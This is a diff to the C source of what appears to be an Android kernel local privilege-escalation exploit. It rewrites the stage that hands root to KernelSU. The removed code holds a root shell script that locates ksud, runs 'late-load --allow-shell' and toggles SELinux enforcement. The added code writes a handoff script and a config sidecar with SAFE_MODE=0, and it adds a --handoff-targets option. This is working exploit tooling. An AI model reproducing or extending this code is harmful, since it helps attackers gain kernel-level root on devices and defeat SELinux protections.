@@ -57,6 +57,7 @@
 #include <sys/resource.h>
 #include <sys/stat.h>
 
+#include "handoff_script.h"
 #include "kbuilds.h"
 #include "profile_fields.h"
 
@@ -143,6 +144,12 @@ static unsigned g_timer_node_off = 0x78;
 static unsigned g_page_gfp_off = 0x18;
 static unsigned g_page_gfp_size = 8;
 static const char *g_profile_path;
+/* The staged handoff target list, one `kind|package|source|kmi` line each;
+ * NULL on a probe or when the service supplied none (fails closed). */
+static const char *g_handoff_targets_path;
+#define HANDOFF_SCRIPT_PATH "/data/local/tmp/ksu_stage.sh"
+#define HANDOFF_MAX_TARGETS 16
+#define HANDOFF_TARGET_MAX 1200
 
 #define CHILD_HELLO 0x52445931
 #define CHILD_MAGIC 0x50474552
@@ -1711,59 +1718,67 @@ static void build_payload(unsigned char *buf, size_t off,
     *(unsigned long long *)(buf + off + 0x10) = target;
 }
 
-/* GhostLock's final stage, reduced to its root-child handoff. */
+/*
+ * The sidecar the shared handoff core reads (`$0.conf`): the target list the
+ * service staged, plus the parameters the core and its timer wrapper need.
+ * The fake-cred child has a fixed envp[], so nothing can ride the environment.
+ */
+static void write_handoff_sidecar(const char *script)
+{
+    char path[256];
+    char lines[HANDOFF_MAX_TARGETS][HANDOFF_TARGET_MAX];
+    int count = 0;
+    FILE *out;
+
+    if (g_handoff_targets_path)
+    {
+        FILE *in = fopen(g_handoff_targets_path, "r");
+
+        if (in)
+        {
+            while (count < HANDOFF_MAX_TARGETS &&
+                   fgets(lines[count], HANDOFF_TARGET_MAX, in))
+            {
+                size_t n = strlen(lines[count]);
+
+                while (n > 0 && (lines[count][n - 1] == '\n' ||
+                                 lines[count][n - 1] == '\r'))
+                    lines[count][--n] = '\0';
+                if (n > 0)
+                    count++;
+            }
+            fclose(in);
+        }
+    }
+    snprintf(path, sizeof(path), "%s.conf", script);
+    out = fopen(path, "w");
+    if (!out)
+        return;
+    /* The timer's log is stdout (the service captures it); the core keeps its
+     * own line stream there and appends nothing to a file. */
+    fprintf(out, "LOG=''\nSAFE_MODE=0\nVRKO_SELINUX_BLOCK='auto'\n"
+                 "MODULE_PATH=''\nMODULE_KO=''\nTARGETS='");
+    /* App-generated wire entries: no single quote can appear (paths and
+     * package names only), so the value needs no escaping here. */
+    for (int i = 0; i < count; i++)
+        fprintf(out, "%s\n", lines[i]);
+    fprintf(out, "'\n");
+    fclose(out);
+    (void)chmod(path, 0644);
+}
+
+/* The shared core, written verbatim, plus the one call that runs it. */
 static void write_ksu_script(void)
 {
-    /*
-     * The handoff is manager-agnostic: find an installed manager whose
-     * libksud.so supports late-load (ReSukiSU, KernelSU, KernelSU-Next,
-     * BakaSU, ...), keep its package name for --package-name, and let ksud
-     * auto-detect the KMI.  The PoC's original me.weishu.kernelsu +
-     * android16-6.12 constants were the author's device.
-     */
-    static const char script[] =
-        "#!/system/bin/sh\n"
-        "echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n"
-        "grep -E '^(Cap|Seccomp)' /proc/self/status\n"
-        "KSUD=''\n"
-        "PKG=''\n"
-        "for p in com.resukisu.resukisu com.sukisu.ultra me.weishu.kernelsu "
-        "com.rifsxd.ksunext org.bakasu.bakasu com.kowx712.supermanager; do\n"
-        "  APK=$(pm path \"$p\" 2>/dev/null | head -1 | cut -d: -f2)\n"
-        "  [ -n \"$APK\" ] || continue\n"
-        "  K=\"$(dirname \"$APK\")/lib/arm64/libksud.so\"\n"
-        "  [ -x \"$K\" ] || continue\n"
-        "  \"$K\" late-load --help >/dev/null 2>&1 || continue\n"
-        "  KSUD=\"$K\"; PKG=\"$p\"; break\n"
-        "done\n"
-        "[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/ksud\n"
-        "[ -x \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud\n"
-        "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing'; exit 1; fi\n"
-        "echo \"[ksu] manager=$PKG ksud=$KSUD version=$(\"$KSUD\" --version 2>&1 | head -1)\"\n"
-        "if [ -n \"$PKG\" ]; then\n"
-        "  \"$KSUD\" late-load --allow-shell --package-name \"$PKG\"\n"
-        "else\n"
-        "  \"$KSUD\" late-load --allow-shell\n"
-        "fi\n"
-        "RC=$?\n"
-        "echo \"[ksu] late-load rc=$RC\"\n"
-        "i=0\n"
-        "while [ $i -lt 50 ]; do\n"
-        "  grep -q '^kernelsu ' /proc/modules && break\n"
-        "  i=$((i+1)); sleep 0.1\n"
-        "done\n"
-        "if grep -q '^kernelsu ' /proc/modules; then echo KSU_LOADED; "
-        "else echo KSU_MISSING; fi\n"
-        "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
-        "echo \"[ksu] enforce=$(getenforce)\"\n";
-    int fd = open("/data/local/tmp/ksu_stage.sh",
-                  O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    FILE *out = fopen(HANDOFF_SCRIPT_PATH, "w");
 
-    if (fd < 0)
+    if (!out)
         return;
-    (void)!write(fd, script, sizeof(script) - 1);
-    close(fd);
-    (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
+    fputs(kHandoffScript, out);
+    fputs("\nhandoff_run\n", out);
+    fclose(out);
+    (void)chmod(HANDOFF_SCRIPT_PATH, 0755);
+    write_handoff_sidecar(HANDOFF_SCRIPT_PATH);
 }
 
 static int read_panic_on_warn(void)
@@ -3236,6 +3251,12 @@ int main(int argc, char **argv)
         {
             profile_path = argv[argi] + 10;
             argi++;
+            continue;
+        }
+        if (!strcmp(argv[argi], "--handoff-targets") && argi + 1 < argc)
+        {
+            g_handoff_targets_path = argv[argi + 1];
+            argi += 2;
             continue;
         }
         break;
